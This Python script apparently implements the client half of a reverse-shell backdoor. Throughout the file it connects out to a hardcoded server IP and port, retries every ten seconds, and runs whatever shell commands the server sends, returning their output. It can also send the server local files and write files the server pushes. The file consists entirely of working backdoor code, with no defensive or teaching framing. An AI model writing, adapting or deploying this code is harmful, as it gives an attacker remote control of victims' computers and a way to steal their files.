import socket
import time
import json
import subprocess
import os


def reliable_recieve(target):
    """
    listening for the incoming result from the target

    Parameters:
    -----------
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #initializing the data to empty
    data = ''

    #repaet until read something
    while True:

        try:
            #recieving 1024 bits from target as json form then decode it
            data = data + target.recv(1024).decode().rstrip()
            #return the result decoded
            return json.loads(data)
        
        except ValueError:
            continue



def reliable_send(data, target):
    """
    sending a data to the target

    Parameters:
    -----------
    data: result of the execution of command (str)
    target: the backdoor socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #encode data to JSON form
    jsonData = json.dumps(data).encode()
    #sending date to the target
    target.send(jsonData)



def upload_file(fileName, target):
    """
    uploading file from current computer

    Parameters:
    -----------
    fileName: name of the file (str)
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #opening the file
    file = open(fileName,'rb')
    #send content to the server
    target.send(file.read())
    #closing the file
    file.close()



def download_file(fileName, target):
    """
    downloading file from current computer

    Parameters:
    -----------
    fileName: name of the file (str)
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """
    
    #open the file
    file = open(fileName,'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        
        file.write(chunk)
        try:
            chunk = target.recv(1024)

        except socket.timeout as error :

            break
    target.settimeout(None)  
    #closing the file 
    file.close() 



def shell(target):
    """
    listening for commands and excute them than send the result to the server

    Parameters:
    -----------
    backdoor_socket: the backdoor socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #execute all the command until the command "quit"
    while True:

        #reading for the incoming command 
        command = reliable_recieve(target)
        #if the command is "quit" stop the program
        if command == 'quit' :

            break

        #if the command is for changing directory
        elif command == "clear":
            
            pass

        #if the command is for changing directory
        elif command[:3] == "cd ":
            
            os.chdir(command[3:])

        #if the command is for downloading a file
        elif command[:8] == "download":

            upload_file(command[9:], target)  
        
        #if the command is for uploading a file
        elif command[:6] == "upload":

            download_file(command[7:], target)    

        #if the command is not "quit" so execute it and send the resend the result to server
        else : 

            #execute the command
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            #sending the result to server
            reliable_send(result , target)



def connection(backdoor_socket, server_ip, server_port):
    """
    establish a connection with the server and execute the incoming commands

    Parameters:
    -----------
    backdoor_socket: the backdoor socket (socket)
    server_ip: IP address of the server (str)
    server_port: opened PORT in the server (int)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """
    
    while True:

        #sleeping 10 seconds before establishing the connection 
        time.sleep(10)
        try:
            
            #connect to the server
            backdoor_socket.connect((server_ip, server_port))
            #executing the command
            shell(backdoor_socket)
            #close the connection
            backdoor_socket.close()
            break

        except:

            #if an error occured during establishing the connection than try to connect again
            connection(backdoor_socket, server_ip, server_port)    
    


#the first argument 'socket.AF_INET' is for using IPV4 and the second 'socket.SOCK_STREAM' is for using TCP protocol
backdoor_socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
#server informations
server_ip = "192.168.1.73"
server_port = 1205
#create a connection from this socket
connection(backdoor_socket, server_ip, server_port)